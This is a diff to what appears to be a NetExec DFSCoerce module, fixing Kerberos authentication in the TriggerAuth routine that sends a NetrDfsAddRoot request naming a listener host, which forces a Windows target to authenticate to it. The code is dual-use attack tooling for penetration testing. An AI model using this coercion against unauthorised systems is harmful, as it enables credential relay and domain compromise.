@@ -2,7 +2,7 @@ from impacket import system_errors
 from impacket.dcerpc.v5 import transport
 from impacket.dcerpc.v5.ndr import NDRCALL
 from impacket.dcerpc.v5.dtypes import ULONG, WSTR, DWORD
-from impacket.dcerpc.v5.rpcrt import DCERPCException
+from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_GSS_NEGOTIATE
 from impacket.uuid import uuidtup_to_bin
 from nxc.logger import nxc_logger
 
@@ -33,9 +33,9 @@ class NXCModule:
             domain=connection.domain,
             lmhash=connection.lmhash,
             nthash=connection.nthash,
-            target=connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
+            target=connection.host,
             doKerberos=connection.kerberos,
-            dcHost=connection.kdcHost,
+            kdcHost=connection.kdcHost,
             aesKey=connection.aesKey,
         )
 
@@ -95,8 +95,9 @@ class NetrDfsAddRootResponse(NDRCALL):
 
 
 class TriggerAuth:
-    def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost):
+    def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, kdcHost):
         rpctransport = transport.DCERPCTransportFactory(r"ncacn_np:%s[\PIPE\netdfs]" % target)
+        rpctransport.setRemoteHost(target)
         if hasattr(rpctransport, "set_credentials"):
             rpctransport.set_credentials(
                 username=username,
@@ -108,11 +109,12 @@ class TriggerAuth:
             )
 
         if doKerberos:
-            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
-        # if target:
+            rpctransport.set_kerberos(doKerberos, kdcHost)
 
-        rpctransport.setRemoteHost(target)
         dce = rpctransport.get_dce_rpc()
+        if doKerberos:
+            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+
         nxc_logger.debug("[-] Connecting to {}".format(r"ncacn_np:%s[\PIPE\netdfs]") % target)
         try:
             dce.connect()
@@ -134,8 +136,7 @@ class TriggerAuth:
             request["ServerName"] = f"{listener}\x00"
             request["RootShare"] = "test\x00"
             request["ApiFlags"] = 1
-            if self.args.verbose:
-                nxc_logger.debug(request.dump())
+            nxc_logger.debug(request.dump())
             dce.request(request)
 
         except Exception as e:
